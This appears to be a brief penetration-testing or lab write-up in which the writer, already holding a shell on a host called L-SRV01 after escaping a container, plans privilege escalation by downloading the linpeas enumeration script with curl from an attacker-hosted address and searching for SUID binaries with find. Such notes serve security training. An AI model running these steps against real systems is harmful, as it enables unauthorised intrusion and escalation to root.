
We have shell on L-SRV01 and escaped the container, we need to perform
local privilege escalation to gain root on the box.

Will download the linpeas script using the curl command.
```
curl -O http://10.50.104.169:8080/linpeas.sh
```


or save a file with specific name
```
curl -o enum.sh  http://10.50.104.169:8080/linpeas.sh
```

As we lost the connect will wait for 15 minutes and see what thing we have to see in the linpeas output.

I think we can't download the scrip so will run the command manually as well as do the enumeration manually.

Already know about the SUID concept as well as we also have the command in order to check specifically for that.
```
find / -perm -u=s -type f 2>/dev/null
```

